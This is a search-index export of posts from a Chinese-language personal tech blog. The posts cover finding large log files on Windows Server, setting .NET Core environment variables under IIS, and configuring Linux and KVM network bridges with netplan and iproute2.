[{"categories":["windoows"],"content":"最近，我們公司的 Windows Server 測試環境 C 朝空間快滿了。這邊我幫主管找找有什麼方法可以找出吃滿空間原因，最後找到一個方法真的找到問題。 ","date":"2023-12-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/:0:0","tags":["windows","file","large"],"title":"如何在 Windows 中找出佔用大量空間的檔案","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/"},{"categories":["windoows"],"content":"其他找大檔案 Google 搜尋到這篇，順利解決問題。 C槽空間不足？(感謝各位大大，肥大的Temp，已解決) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 dir c:\\ /s | find \"/\" | find /V \"\u003cDIR\u003e\" | sort /+22 /R \u003e filelist.txt notepad filelist.txt Question Q:你說說這個是在說什麼事情? Github Copilot: 這段程式碼是在 Windows 的命令提示字元 (Command Prompt) 中執行的，用來找出在 C 磁碟中佔用大量空間的檔案。 dir c:\\ /s：這個命令會列出 C 磁碟中的所有檔案和目錄，包括子目錄。 | find “/\"：這個命令會從上一個命令的輸出中找出包含 “/” 的行，這些行通常是檔案的詳細資訊。 | find /V “\u003cDIR\u003e\"：這個命令會從上一個命令的輸出中排除包含 \"” 的行，這些行通常是目錄的詳細資訊。 | sort /+22 /R：這個命令會根據每行的第 22 個字元開始的部分進行排序，並且是反向排序，也就是從大到小。 filelist.txt：這個命令會將上一個命令的輸出寫入到 filelist.txt 這個檔案中。 notepad filelist.txt：這個命令會用筆記本開啟 filelist.txt 這個檔案。 所以整體來說，這段程式碼的目的是找出 C 磁碟中佔用空間最大的檔案，並將這些檔案的詳細資訊寫入到一個檔案中，然後開啟這個檔案。 ","date":"2023-12-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/:1:0","tags":["windows","file","large"],"title":"如何在 Windows 中找出佔用大量空間的檔案","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/"},{"categories":["windoows"],"content":"找到 evtx 日誌檔吃滿整個磁區 從filelist.txt看到這些內容。 2021/10/05 下午 02:46 \u003cJUNCTION\u003e javapath [C:\\Program Files\\Common Files\\Oracle\\Java\\javapath_target_3022084093] 2021/09/03 上午 11:38 \u003cJUNCTION\u003e javapath [C:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath_target_246134687] 2021/08/31 下午 04:25 383,350,399 d58716ddb4592d3b_blobs.bin 2023/04/25 下午 05:02 314,576,896 Archive-Security-2023-04-25-09-02-12-800.evtx 2023/04/22 下午 10:41 314,576,896 Archive-Security-2023-04-22-14-41-17-224.evtx 2023/04/21 下午 10:17 314,576,896 Archive-Security-2023-04-21-14-17-45-018.evtx 2023/04/20 下午 09:08 314,576,896 Archive-Security-2023-04-20-13-08-23-369.evtx 2023/04/19 下午 08:20 314,576,896 Archive-Security-2023-04-19-12-20-55-427.evtx 2023/04/18 下午 07:31 314,576,896 Archive-Security-2023-04-18-11-31-45-658.evtx 2023/04/17 下午 07:12 314,576,896 Archive-Security-2023-04-17-11-12-00-398.evtx 2023/04/16 下午 06:00 314,576,896 Archive-Security-2023-04-16-10-00-25-604.evtx 2023/04/15 下午 05:23 314,576,896 Archive-Security-2023-04-15-09-23-25-800.evtx 2023/04/14 下午 04:07 314,576,896 Archive-Security-2023-04-14-08-07-33-936.evtx 2023/04/13 下午 03:12 314,576,896 Archive-Security-2023-04-13-07-11-59-561.evtx 2023/04/12 下午 01:33 314,576,896 Archive-Security-2023-04-12-05-33-24-732.evtx 2023/04/11 下午 12:39 314,576,896 Archive-Security-2023-04-11-04-39-38-857.evtx 2023/04/10 上午 11:45 314,576,896 Archive-Security-2023-04-10-03-45-03-725.evtx 2023/04/09 上午 11:02 314,576,896 Archive-Security-2023-04-09-03-02-00-306.evtx 2023/04/08 上午 09:49 314,576,896 Archive-Security-2023-04-08-01-49-46-090.evtx 2023/04/07 上午 08:16 314,576,896 Archive-Security-2023-04-07-00-16-33-689.evtx 2023/04/06 上午 07:03 314,576,896 Archive-Security-2023-04-05-23-03-55-035.evtx 2023/04/05 上午 06:15 314,576,896 Archive-Security-2023-04-04-22-15-47-296.evtx 2023/04/04 上午 05:40 314,576,896 Archive-Security-2023-04-03-21-40-42-547.evtx 2023/04/03 上午 04:35 314,576,896 Archive-Security-2023-04-02-20-35-38-895.evtx 2023/04/02 上午 03:42 314,576,896 Archive-Security-2023-04-01-19-42-51-936.evtx 2023/04/01 上午 02:40 314,576,896 Archive-Security-2023-03-31-18-40-36-290.evtx 2023/03/31 上午 01:18 314,576,896 Archive-Security-2023-03-30-17-18-36-317.evtx 2023/03/30 上午 12:07 314,576,896 Archive-Security-2023-03-29-16-07-16-418.evtx 2023/03/28 下午 09:01 314,576,896 Archive-Security-2023-03-28-13-01-43-822.evtx 2023/03/27 下午 04:56 314,576,896 Archive-Security-2023-03-27-08-56-25-263.evtx 2023/03/26 下午 12:31 314,576,896 Archive-Security-2023-03-26-04-31-26-971.evtx 2023/03/25 上午 08:16 314,576,896 Archive-Security-2023-03-25-00-16-09-305.evtx 2023/03/24 上午 04:29 314,576,896 Archive-Security-2023-03-23-20-29-45-988.evtx 2023/03/23 上午 12:37 314,576,896 Archive-Security-2023-03-22-16-37-31-194.evtx 2023/03/21 下午 08:11 314,576,896 Archive-Security-2023-03-21-12-11-54-348.evtx 2023/03/20 下午 04:01 314,576,896 Archive-Security-2023-03-20-08-01-22-186.evtx 2023/03/19 上午 10:37 314,576,896 Archive-Security-2023-03-19-02-37-28-300.evtx 2023/03/18 上午 05:08 314,576,896 Archive-Security-2023-03-17-21-08-23-279.evtx 2023/03/17 上午 12:09 314,576,896 Archive-Security-2023-03-16-16-09-37-047.evtx 2023/03/15 下午 07:27 314,576,896 Archive-Security-2023-03-15-11-27-56-726.evtx 2023/03/14 下午 02:31 314,576,896 Archive-Security-2023-03-14-06-31-30-863.evtx 2023/03/13 上午 09:25 314,576,896 Archive-Security-2023-03-13-01-25-42-753.evtx 2023/03/12 上午 04:37 314,576,896 Archive-Security-2023-03-11-20-37-16-816.evtx 2023/03/10 下午 11:26 314,576,896 Archive-Security-2023-03-10-15-26-29-972.evtx 2023/03/09 下午 06:55 314,576,896 Archive-Security-2023-03-09-10-55-09-524.evtx 2023/03/08 下午 02:23 314,576,896 Archive-Security-2023-03-08-06-23-46-315.evtx 2023/03/07 上午 09:56 314,576,896 Archive-Security-2023-03-07-01-56-56-356.evtx 2023/03/06 上午 04:50 314,576,896 Archive-Security-2023-03-05-20-50-41-431.evtx 2023/03/04 下午 11:47 314,576,896 Archive-Security-2023-03-04-15-47-30-324.evtx 2023/03/03 下午 06:50 314,576,896 Archive-Security-2023-03-03-10-50-19-677.evtx 2023/03/0","date":"2023-12-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/:1:1","tags":["windows","file","large"],"title":"如何在 Windows 中找出佔用大量空間的檔案","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/"},{"categories":["windoows"],"content":"其他可能造成原因 可以參考看看，說不定會命中找到問題。 The Best Way to Automatically Clean Up the Temp Directory on Windows 10 - NEXTOFWINDOWS.COM (7) c槽磁碟空間不足 解壓縮的暫存空間在哪?(清除電腦垃圾) winrar​暫存區 - YouTube Tip Github Copilot: 在 Windows Server 上找到佔用大量空間的檔案，您可以使用內建的磁碟清理工具或者第三方的磁碟分析工具。以下是一個基本的步驟： 使用 Windows 內建的磁碟清理工具： 打開「檔案總管」，然後右鍵點擊您想要分析的磁碟，選擇「屬性」。 在「一般」標籤下，點擊「磁碟清理」。 磁碟清理工具將會計算可以釋放的空間，並列出各種檔案類型和它們佔用的空間。 您可以選擇要刪除的檔案類型，然後點擊「確定」。 使用第三方的磁碟分析工具，例如 WinDirStat 或 TreeSize Free： 下載並安裝工具。 選擇您想要分析的磁碟或資料夾。 工具將會分析磁碟空間的使用情況，並以圖形化的方式顯示結果。 您可以根據結果找到佔用大量空間的檔案或資料夾。 請注意，刪除檔案時要小心，確保不要刪除系統或重要的檔案。如果您不確定某個檔案是否可以刪除，最好先做好備份或尋求專業的幫助。 ","date":"2023-12-03","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/:2:0","tags":["windows","file","large"],"title":"如何在 Windows 中找出佔用大量空間的檔案","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E6%89%BE%E5%87%BA%E4%BD%94%E7%94%A8%E5%A4%A7%E9%87%8F%E7%A9%BA%E9%96%93%E7%9A%84%E6%AA%94%E6%A1%88/"},{"categories":[".Net Core"],"content":"在驗證環境設定全域環境變數ASPNETCORE_ENVIRONMENT=Staging，但我看環境沒有生效…。我後來嘗試開exe有吃到，後來猜測是 ISS 問題，最後找到這篇。 參考:[IIS] 從IIS設定環境變數指定ASP.NET Core站台的執行環境 | Ian Chen - 點部落 ","date":"2023-10-07","objectID":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/:0:0","tags":["windows",".net core","deploy","iis","environment"],"title":"IIS 佈署 .Net Core 設定環境變數方法","uri":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"方法1: 系統設定環境變數(推薦) 後來入職進去，發現公司測試環境沒有在 IIS 設定相關設定，這就激起我的好奇心。發現他是用系統環境變數用的。 因為我突然想到，在學 .Net 課程時候有提到，相關設定環境變數後需要重啟命令提示字元，讓我猜測 IIS 環境變數也應該遇到一樣問題。後續重啟 IIS 服務可順利抓到環境變數。 iisreset /restart Warning 重啟IIS上面伺服器、站台都沒有用，需要重啟IIS服務才會生效，這邊重開機理論上也可以吃到。 這種方法應該比較方便，網路很多教學都是在 IIS 設定環境變數，我這邊也有嘗試看看。可以繼續往下看。 ","date":"2023-10-07","objectID":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/:1:0","tags":["windows",".net core","deploy","iis","environment"],"title":"IIS 佈署 .Net Core 設定環境變數方法","uri":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"方法2: IIS 上設定環境變數 IIS首頁 or 站台 設定編輯器 區段選擇 “system.webServer/aspNetCore” environmentVariables 四個步驟花了不少時間，截圖記錄一下。 Sites底下底專案站台選擇設定編輯器。，建議選主機全域，不然發布會不見， 進去點擊專案會發現沒看到system.webServer/aspNetCore，但其實要點下圖紅框。 再來把該打的環境變數打上去就OK了。 Tip P.S. 選主機是全域站台設定，而站台是針對一個站台設定，選站台他是寫在站台的Web.Config，所以重新佈署時如果蓋掉該檔就會失效。 Warning 這邊假如你有用 FFMpegCore 的話，需要注意也需要重啟 IIS 。 ","date":"2023-10-07","objectID":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/:2:0","tags":["windows",".net core","deploy","iis","environment"],"title":"IIS 佈署 .Net Core 設定環境變數方法","uri":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":[".Net Core"],"content":"參考相關文章 asp.net core 在IIS設定環境變數 | Jakeuj - 點部落 .NET Core 多環境佈署設定 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2023-10-07","objectID":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/:3:0","tags":["windows",".net core","deploy","iis","environment"],"title":"IIS 佈署 .Net Core 設定環境變數方法","uri":"/blog/posts/IIS-%E4%BD%88%E7%BD%B2-Net-Core-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["網路"],"content":"之前研究 Linux 怎麼用橋接器是為了讓我別台電腦可以直接連到 VM，之前都要 Fortgate 防火牆設置路由表(route)，後來覺得應該可以用橋接器來做連接，這邊用 Ubuntu 實作怎麼在 KVM 設定 VM 網路 橋接連至實體區網。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:0:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"整理相關文章做法 這邊其實網路上實作有很多方法，很多都是用指令方式操作，我那時很很好奇有沒有 GUI 操作設定方法，不過發現 KVM 沒有比較好方法設定。 這邊放一下我爬文相關解決方法，感覺針對不同環境會有不同做法，大家實作可能需要注意一下。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:1:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"Netplan 設定 Ubuntu 下 KVM 的 Bridge Networking » j7 碎唸人生 Configure KVM Bridge Network using netplan – ServerOK 玩具烏托邦: (幾乎不談指令) 概念性的 netplan 簡介 面有一句最重要的 renderer， 由這句話指定到底要用 NetworkManager 還是要用 networkd 來實作網路連線 我原本在找renderer是什麼，這邊有簡單提到 [機派X] Day 6 - Linux 沒網路，我要怎麼發鐵人賽的文章 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 Ubuntu 傳統的網路管理工具有三種： /etc/network/interfaces network-manager systemd-networkd 裡面還有提到很Ubuntu網路知識，真的是值得推薦好文章。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:1:1","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"nmcli,nmtui Create and Configure Bridge Networking For KVM in Linux | ComputingForGeeks 裡面提供很多種方法，可以參考一下。 [Linux KVM] Linux KVM concept - Networking | 小信豬的原始部落 裡面用 nmcli。 How to set up a network bridge for virtual machine communication | Enable Sysadmin 裡面用 nmtui。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:1:2","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"kvm 設定 KVM：虚拟机网卡模式改为bridge-阿里云开发者社区 KVM虚拟机修改网卡为桥接网络 - SoulChild随笔记 创建网桥 virsh iface-bridge eth0 br0 取消时可以使用 virsh iface-unbridge br0 沒有測試這樣能不能跑，不過享用的可以試試。不知道重開機還要不要重新調整。xml找不到相對應設定方法。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:1:3","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"疑似以前方法? network scripts KVM Network Bridge Setup How to use bridged networking with libvirt and KVM - Linux Tutorials - Learn Linux Configuration ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:1:4","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"修復 Ubuntu 方法彩蛋 我在做這邊的時候，我網路 GUI 看不到東西， nmcli 網路看到介面卡是unmangend。 解決 Ubuntu 16 以後，有線網路未受管理的問題 ubuntu 18.04 ‘Wired Unmanaged’ 网络无法配置解决方法 | Richard Qiu的博客 Ubuntu 斷網 及 Wired Connection 不見問題 - HackMD ubuntu network device not managed 解决办法汇总 Lebal:Research - Radiumlrb - 博客园 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:2:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"我理想預設 bridge 理想 可以控制用 NAT 或者 Bridge到外面網路，這樣比較彈性。 原本想用無線網卡，但是無線網卡做橋接需要把網路改成熱點方式，這不是我想要的，所以就放棄這個方案。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:3:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"使用 netplan 這邊 bridge 想用自動取得 IP 也是能做到的，但之前那個 IP 設定在 DHCP Server ，覽的調整可以先設定固定在主機上面。 /etc/netplan/ network: version: 2 # renderer: NetworkManager \u003c-- 我這個有設定會不能上網，這邊看情況設定 ethernets: enp7s0f5: dhcp4: false dhcp6: false bridges: br2: interfaces: [enp7s0f5] addresses: [192.168.1.210/24] routes: - to: 0.0.0.0/0 via: 192.168.1.1 nameservers: addresses: [192.168.1.203] dhcp4: false dhcp6: true netplan try ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:4:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"使用內建 GUI 設定 這邊假如你的 Ubuntu 不正常可以看上方修復處理方法。使用下面指令開啟網路連線設定。 sudo nm-connection-editor 點選+新增相關網路。 選擇橋接做建立動作。 這邊我已經用netplan設定好了，我選擇編輯看設定。但跟新增介面一樣，可以設定路由名稱。 我們要把實體網卡做橋接連接動作，參考下圖設定動作。先點選新增，選擇有線網路。 選擇實體網卡裝置。 設定相關網路設定。 因為我Ubuntu網路怪怪的，~~這邊重開機就可以看有沒有生效。~~理論上會直接生效。可以用ip a看看，我後來上面 Ubuntu 網路問題解決就沒這個問題。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:5:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"KVM 設定橋接器 有用 WebVirtCloud的話請刪除再新增，不知道為什麼修改沒什麼用。 網路要設定 e1000 才能連線。 發現無法改的話到這邊改。 ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:6:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"彩蛋 最後發現 netplan 好像還滿多可以設定的，有興趣可以玩玩。 netplan网络配置 — Cloud Atlas 0.1 文档 Netplan documentation ","date":"2023-09-24","objectID":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/:7:0","tags":["ubuntu","bridge","kvm","vm"],"title":"Ubuntu 使用 Bridge 讓外面網路可以連 KVM 虛擬主機","uri":"/blog/posts/Ubuntu-%E4%BD%BF%E7%94%A8-Bridge-%E8%AE%93%E5%A4%96%E9%9D%A2%E7%B6%B2%E8%B7%AF%E5%8F%AF%E4%BB%A5%E9%80%A3-KVM-%E8%99%9B%E6%93%AC%E4%B8%BB%E6%A9%9F/"},{"categories":["網路"],"content":"最近要讓 KVM 不透過設定路由，想直接連接到現有網段，這邊繼網路新手虛擬網路設備 veth pair 實作筆記 - 程式狂想筆記這篇研究，我們這邊簡單操作 Linux Bridge 讓多種孔可以互相連線。 參考這篇範例Linux Bridge 详解 | 没有理想的人不伤心在 Ubuntu 就可以實作出來，不過我發現bridge-utils大多數 Linux 都沒安裝。iproute2好像也能設定Bridge，這邊會換一下指令看看。 # 新增網橋 # 原方法: brctl addbr br0 ip link add name br0 type bridge # 啟動網橋 ip link set br0 up # 新增三個netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 新增兩對veth ip link add veth0-ns type veth peer name veth0-br ip link add veth1-ns type veth peer name veth1-br ip link add veth2-ns type veth peer name veth2-br # 將veth的一端移動到netns中 ip link set veth0-ns netns ns0 ip link set veth1-ns netns ns1 ip link set veth2-ns netns ns2 # 將netns中的本地環回和veth啟動並組態IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set veth0-ns up ip netns exec ns0 ip addr add 10.0.0.1/24 dev veth0-ns ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set veth1-ns up ip netns exec ns1 ip addr add 10.0.0.2/24 dev veth1-ns ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set veth2-ns up ip netns exec ns2 ip addr add 10.0.0.3/24 dev veth2-ns # 將veth的另一端啟動並掛載到網橋上 ip link set veth0-br up ip link set veth1-br up ip link set veth2-br up # brctl addif br0 veth0-br ip link set veth0-br master br0 # brctl addif br0 veth1-br ip link set veth1-br master br0 # brctl addif br0 veth2-br ip link set veth2-br master br0 這邊就不詳細講 bridge，可以看一下我之前寫的Bridge 和 NAT 差異，這邊看完就應該知道 Bridge 原理和一些要注意的問題。 網路 Bridge 和 NAT 差異 - 程式狂想筆記 ","date":"2023-09-17","objectID":"/blog/posts/%E8%AE%93%E8%99%9B%E6%93%AC%E7%B6%B2%E8%B7%AF%E5%AD%94%E5%92%8C%E5%90%84%E7%A8%AE%E8%A8%AD%E5%82%99%E9%80%A3%E6%8E%A5%E8%B5%B7%E4%BE%86-Linux-Bridge-%E5%AF%A6%E4%BD%9C/:0:0","tags":["網路","bridge","linux","netns"],"title":"讓虛擬網路孔和各種設備連接起來 - Linux Bridge 